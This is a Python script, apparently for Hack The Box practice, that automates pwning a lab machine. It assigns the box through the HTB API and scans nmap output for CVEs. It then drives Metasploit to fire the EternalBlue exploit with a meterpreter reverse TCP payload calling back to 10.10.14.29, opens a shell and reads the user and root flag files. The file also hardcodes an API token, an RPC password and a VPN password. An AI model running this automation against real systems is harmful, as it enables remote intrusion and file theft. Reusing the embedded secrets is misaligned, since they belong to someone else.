import os, json, argparse, requests, time, csv, re
import libtmux, htb, nmap
from box import Box
import pandas as pd
import cve_searchsploit as CS
import getsploit
import pyperclip
import pymetasploit3
from pymetasploit3 import *
from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient('Km9EcHcp', port=55552)


parser = argparse.ArgumentParser(description='What box do you want to pwn?')
parser.add_argument('--box', required=True)
name = parser.parse_args()
api = htb.HTB('OwBnueBa1zprFdqbWRQnNiXpyr0T1lIkZFQrwGUK0xnjD4Rs3yQxuUEGlHec')
BASE_URL = 'https://www.hackthebox.eu/api'
listOfBoxes = []
#print(a.get_machine(7))
#print(type(a.get_machine(7)))
#list = a.get_machine(7).get("ip")
#print(list)

def initBoxes():
    rawBoxes = api.get_machines()
    for rawBox in rawBoxes:
        listOfBoxes.append(Box(rawBox))

def printAllBoxes():
    for box in listOfBoxes:
        print(box.__repr__())
    #print(all)
    #print(*all, sep='\n')

        #print(el)
        #print(el.get("name"))
        #print(el["ip"])

    #formatlist = str(a.get_machines()).strip('[]')
    #print(type(formatlist))
    #formatlist = formatlist.replace("'", "\"")
    #res = json.loads(formatlist)
    #print(res)
    #list = res.get("name")

def getBoxIP(name: str) -> str:
    for box in listOfBoxes:
        #for attribute, value in box.__dict__.items():
        if box.name == name.box:
            print(box.ip)
            return box.ip
            #box.spawned
        #if box.get("name") == name:
        #    print(box["ip"])

def getBoxID(name: str) -> str:
    for box in listOfBoxes:
        #for attribute, value in box.__dict__.items():
        if box.name == name.box:
            print(box.id)
            return box.id
            #box.spawned
        #if box.get("name") == name:
        #    print(box["ip"])

def auth(path: str) -> str:
        """
        Helper function to generate an authenticated URL
        :params self: HTB object in use
        :params path: string containing path to query
        :returns: path to authenticated query
        """
        print("{}?api_token={}".format(path, api.api_key))
        return "{}?api_token={}".format(path, api.api_key)


def controlBox(name: str, action: str):
    mid = getBoxID(name)
    print(mid)
    r = requests.post(BASE_URL + auth('/vm/vip/{}/{}'.format(action, mid)), headers=api.headers).json()
    if r["success"] != 1:
        print("Error:" + (r["status"]))

def workflow():
    CS.update_db()
    #Open a terminal with tmux
    # os.system("xfce4-terminal -e \'bash -c \"tmux new-session -s sisc; bash\"\'")
    # time.sleep(1)
    # server = libtmux.Server()
    # session = server.find_where({ "session_name": "sisc" })
    # window = session.attached_window
    # window.rename_window('nmap')
    # paneVpn = window.attached_pane
    # time.sleep(10)
    # paneVpn.send_keys("nmap --script vuln -sC -sV -Pn -oA " + name.box +" " + getBoxIP(name))
    cveList = []
    with open(name.box + ".nmap", newline='') as nmapfile:
        cves=[]
        lines = nmapfile.read().splitlines()
        for line in lines:
            cves = re.findall(r'CVE-\w+-\w+', line)
            for cve in cves:
                cveList.append(cve)
            # if 'CVE' in line:
            #     print(line)
    #paneVpn.send_keys("")
    cveList = list(dict.fromkeys(cveList))
    exploitList = []
    # for cve in cveList:
    #     print(cve)
    #     print(CS.edbid_from_cve(cve))
    #     for i in CS.edbid_from_cve(cve):
    #         os.system("searchsploit -p " + str(i))
    #         #print(pyperclip.paste())
    #         exploitList.append(pyperclip.paste())
    #         time.sleep(5)
    # print(exploitList)
    # for exploit in exploitList:
    #     print(exploit)
    # with open("exploits.txt", newline='') as exploitfile:
    #     exploits=[]
    #     lines = exploitfile.read().splitlines()
    #     for line in lines:
    #         print(line)
    #         exploits = re.findall(r'exploits/\w+/w+/$\w+', line)
    #         for exploit in exploits:
    #             print(exploit)
    #print(client.modules.exploits)
    exploit = client.modules.use("exploit", "windows/smb/ms17_010_eternalblue")
    #print(exploit.description)
    exploit['RHOSTS'] = getBoxIP(name)
    # print(exploit.required)
    # print(exploit.runoptions)
    # print(exploit.references)
    # print(exploit.targets)
    # print(exploit.targetpayloads())
    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
    # print(payload.required)
    # print(payload.runoptions)
    payload['LHOST'] = '10.10.14.29'
    #exploit['DisablePayloadHandler'] = False
    exploit.execute(payload=payload)
    print(client.sessions.list)
    shell = client.sessions.session(list(client.sessions.list.keys())[0])
    shell.write('whoami')
    shell.read()
    print(shell.run_with_output('pwd'))
    print(shell.run_with_output('search -f user.txt'))
    print(shell.run_with_output('search -f root.txt'))
    print(shell.run_with_output('cat \'C:\\Users\\Administrator\\Desktop\\root.txt\''))
    print(shell.run_with_output('cat \'C:\\Users\\haris\\Desktop\\user.txt\''))

    #shell.run_shell_cmd_with_output('pwd')
    nm = nmap.PortScanner()
    #nm.scan(hosts=getBoxIP(name), arguments='-sC -sV -Pn')
    #nm.scan(hosts=getBoxIP(name), arguments='--script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -sC -sV -Pn')
    #print(nm.csv())
    #print(nm.command_line())
    #with open('nmapOutput.csv', 'w') as f:
#        print(nm.csv(), file=f)
    # with open('nmapOutput.csv', 'w', newline='') as file:
    #     writer = csv.writer(file)
    #     writer.writerows(nm.csv())
    # productList = []
    # with open('nmapOutput.csv', newline='') as csvfile:
    #     spamreader = csv.reader(csvfile, delimiter=';', quotechar='|')
    #     for row in spamreader:
    #         print(', '.join(row))
    #         if(row and row[7]):
    #             print(row[7])
    #             print("\n")
    #             productList.append(row[7])
    # for i in productList:
    #     print(i)
    #CS.edbid_from_cve("CVE-2019-0708")
        # for line in csvfile:
	    #        csvfile.write(line.replace(';', ','))
        # df = pd.read_csv(csvfile)
        # column = df['product']
        # print(column)
    # #Start HTB VPN on a window
    # window.rename_window('vpn')
    # paneVpn = window.split_window(attach=True)
    # paneVpn.send_keys('openvpn DonDada.ovpn')
    # time.sleep(5)
    #paneVpn.send_keys('Menime1212!')
    #time.sleep(10)
    #Add a new window for nmap
    # windowsNmap = session.new_window(attach=True, window_name="nmap")
    # paneNmap = windowsNmap.split_window(attach=True)
    # paneNmap.send_keys("nmap -sC -sV -oA " + name.box +" " + getBoxIP(name))
    #Add a new window for searchsploit


initBoxes()
#Switch to assign/remove box
controlBox(name, "assign")
#printAllBoxes()
workflow()
